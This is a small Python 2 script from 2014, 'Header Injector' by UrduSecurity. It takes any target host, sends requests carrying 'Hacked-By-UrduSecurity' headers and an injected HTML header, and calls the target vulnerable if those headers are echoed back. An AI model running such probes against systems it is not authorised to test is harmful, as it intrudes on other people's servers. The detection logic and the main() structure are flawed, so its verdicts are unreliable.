#!/usr/bin/python

import os,urllib2

os.system('clear')

def title():
	print '''
	-- UrduSecurity Free Tools Library --
	-- Tool: %s --
	-- Visit: %s  --
	-- Author: %s --
	-- Release: %s --
	
	UrduSecurity - a Vally of Knowledge\n\n'''%(__Script__,__visit__,__Author__,__Release__)

# define variables
__visit__ = "http://urdusecurity.blogspot.com"
__Author__ = "Muhammad Adeel | Founder UrduSecurity (c) 2014"
__Script__ = "Header Injector =Free= Version"
__Release__ = "01/07/2014"
title()
__host__ = raw_input('Enter Target Host: ')

def urdusecurity():
	print '''
	()
	-- Thanks For Using %s --
	
	 +-+-+-+-+-+-+-+-+-+-+-+-+
	 |U|r|d|u|S|e|c|u|r|i|t|y|
	 +-+-+-+-+-+-+-+-+-+-+-+-+
	
	\n'''% __Script__

def HTTPHeaderInjector():
	pre_payload = urllib2.Request(__host__)
	pre_payload.add_header('UrduSecurity-Cookie', 'Hacked-By-UrduSecurity')
	pre_payload.add_header('UrduSecurity-html', '<html>Stamped By UrduSecurity<br>-Muhammad Adeel-</html>')
	send_payload = urllib2.urlopen(pre_payload)
	if send_payload.headers.has_key('UrduSecurity-Cookie'):
		os.system('clear')
		urdusecurity()
		print '[+] Target is Vulnerable to HTTP Header Injection'
		print send_payload.headers.items()
		raw_input('Hit Enter to Exit')
	elif send_payload.headers.has_key('UrduSecurity-html'):
		os.system('clear')
		urdusecurity()
		print '[+] Target is Vulnerable to HTTP Header Injection'
		print send_payload.headers.items()
		raw_input('Hit Enter to Exit')
	else:
		os.system('clear')
		urdusecurity()
		print '[-] Bad Luck, Try Another Host'
		raw_input('Hit Enter to Exit')

HTTPHeaderInjector()

def main():
	title()
	urdusecurity()
	if __name__ == '__main__':
		main()
